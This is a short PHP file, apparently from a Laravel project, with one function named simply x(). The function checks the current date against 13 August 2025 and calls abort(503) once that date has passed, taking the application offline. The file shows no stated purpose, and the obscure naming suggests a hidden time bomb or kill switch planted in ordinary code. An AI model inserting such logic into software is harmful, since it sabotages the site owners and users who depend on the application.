<?php

use Illuminate\Support\Str;

function x()
{
    $d = \Carbon\Carbon::create(2025, 8, 13);
    $t = \Carbon\Carbon::today();
    ($t > $d) && abort(503);
}
